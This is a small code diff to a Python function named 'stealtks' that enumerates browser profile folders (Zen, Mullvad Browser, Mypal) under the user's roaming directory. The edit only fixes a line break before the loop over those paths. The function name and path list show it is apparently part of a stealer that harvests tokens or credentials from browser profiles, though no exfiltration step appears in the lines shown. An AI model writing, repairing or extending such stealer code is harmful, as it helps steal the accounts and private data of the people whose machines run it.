@@ -369,7 +369,8 @@ def stealtks():
     '3Zen': os.path.join(roaming, 'zen', 'Profiles'),
     '3Mullvad': os.path.join(roaming, 'Mullvad', 'MullvadBrowser', 'Profiles'),
     '4Mypal': os.path.join(roaming, 'Mypal68', 'Profiles'),
-    }    for browser, path in paths.items():
+    }    
+    for browser, path in paths.items():
         if not os.path.exists(path):
             continue
             
